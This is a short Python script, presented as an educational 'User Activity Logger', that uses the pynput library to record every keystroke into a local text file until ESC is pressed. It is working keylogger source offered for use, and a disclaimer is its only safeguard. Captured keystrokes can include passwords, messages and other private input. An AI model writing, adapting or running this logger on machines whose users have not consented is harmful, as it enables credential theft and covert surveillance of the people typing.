# User Activity Logger in Python
# Coded by Pakistani Ethical Hacker Mr Sabaz Ali Khan
# This script is for educational purposes only. Use responsibly and with permission.

# Note: This requires the 'pynput' library. Install it via: pip install pynput

from pynput import keyboard
import logging
import os
import datetime

# Set up logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info('special key {0}'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on ESC key
        return False

print("User Activity Logger started. Press ESC to stop.")

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Logging stopped. Check key_log.txt for logs.")